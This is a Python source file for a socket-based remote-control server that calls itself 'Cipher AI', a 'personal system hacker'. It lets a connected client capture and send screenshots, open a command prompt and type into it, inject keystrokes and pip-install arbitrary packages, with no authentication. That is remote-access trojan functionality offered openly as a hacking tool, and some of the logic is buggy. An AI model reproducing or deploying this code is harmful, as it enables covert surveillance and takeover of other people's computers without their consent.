import socket
import os
import subprocess
import keyboard
import time
import psutil
import random
import pyautogui
import zlib
import struct

def sendmsg(response):
    client_socket.send(response.encode())

def system_info():
    battery = psutil.sensors_battery()
    plugged = battery.power_plugged
    percent = battery.percent
    if plugged:
        plugged_status = "Plugged In"
        cpu_usage = psutil.cpu_percent(interval=1)
        memory = psutil.virtual_memory().percent
        print(f"Battery is {percent}% charged and {plugged_status} || CPU usage is {cpu_usage} percent || Memory usage is {memory} percent")
        response = f"Battery is {percent}% charged and {plugged_status} || CPU usage is {cpu_usage}% || Memory usage is {memory}%"
        sendmsg(response)
    else:
        plugged_status = "Not Plugged In"
        cpu_usage = psutil.cpu_percent(interval=1)
        memory = psutil.virtual_memory().percent
        print(f"Battery is {percent}% charged and {plugged_status} || CPU usage is {cpu_usage}% || Memory usage is {memory}%")
        response = f"Battery is {percent}% charged and {plugged_status} || CPU usage is {cpu_usage}% || Memory usage is {memory}%"
        sendmsg(response)

def install_module(module_name):
    try:
        subprocess.check_call(["pip", "install", module_name])
        print(f"Successfully installed {module_name}")
        response = f"Successfully installed {module_name}"
        sendmsg(response)
    except subprocess.CalledProcessError:
        print(f"Failed to install {module_name}")
        response = f"Failed to install {module_name}"
        sendmsg(response)

query = {
    "hello": ["Hello!", "Hi there!", "Hello! i am Cipher","Hello sir! how can i help you"],
    "name": ["My name is Cipher AI.", "You can call me Cipher.", "I'm Cipher."],
    "how are you": ["I'm doing well, thank you.", "I'm great, thanks for asking.", "All good, how about you?"],
    "full name": ["My full name is Cipher AI, I am personal system hacker","My full name is Cipher AI"],
    "purpose": ["My purpose is contorl the computer system","I am personal system hacker for control any computer system"],
    "created you":["i am created by Gagan","I am created by Gagan on 9th March 2024"],
    "what can you do":["I can control the whole system","I can hack the whole system"]
}

def response_fun(response):
    matched_keys = [key for key in query.keys() if key in response]
    if matched_keys:
        for key in matched_keys:
            t = random.choice(query[key])
            sendmsg(t)
    else:
        response = f"{command} no commands faund!!"
        sendmsg(response)

# Server ka IP address aur port number
hostname = socket.gethostname()
ip_address = socket.gethostbyname(hostname)
print(f"IP Address: {ip_address}")

SERVER_IP = ip_address
SERVER_PORT = 54321

#Creating object of socket
server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.bind((SERVER_IP, SERVER_PORT))

#waiting for connection
server_socket.listen()
print('Server started, waiting for clients...')

client_socket, client_address = server_socket.accept()
print('Client connected:', client_address)

response = f"Connection from {hostname} established successfully"
sendmsg(response)

while True:
    data = client_socket.recv(1024).decode()
    print(f"Client :{data}")
    command = data.lower()

    if 'exit' in command:
        response = "Conection turn off"
        sendmsg(response)
        client_socket.close()
        server_socket.close()
    
    elif 'system info' in command:
        system_info()
    
    elif 'screenshot' in command:
        try:
           screenshot = pyautogui.screenshot()
           screenshot = screenshot.resize((800,600))
           screenshot_bytes = screenshot.tobytes()
           compressed_screenshot = zlib.compress(screenshot_bytes)
           message_size = struct.pack("L", len(compressed_screenshot))
           
           client_socket.sendall(message_size)
           client_socket.sendall(compressed_screenshot)
        except:
            response = "screenshot failed!"
            sendmsg(response)
        
    elif 'open cmd' in command:
        os.system("start cmd")
        response = "open cmd successfully"
        sendmsg(response)
        time.sleep(1)
        if 'write' in command:
            command = command.replace("write","")
            command = command.replace("open cmd","").split()
            keyboard.write(command)
            keyboard.send('enter')
            response = f"write {command} successfully"
            sendmsg(response)

    elif 'pip install' in command:
        command = command.replace("pip install ","")
        command = command.replace("install ","")
        install_module(command)
    
    elif 'press' in command:
        command = command.replace("press","").split()
        keyboard.send(command)
        response = f"press {command} successfully"
        sendmsg(response)

    elif 'write' in command:
        command = command.replace("write","").split()
        keyboard.write(command)
        response = f"write {command} successfully"
        sendmsg(response)
    
    if 'exit' in command:
        response = "Conection turn off"
        sendmsg(response)
        client_socket.close()
        server_socket.close()
    
    else:
        response_fun(command)

# Connection ko close kare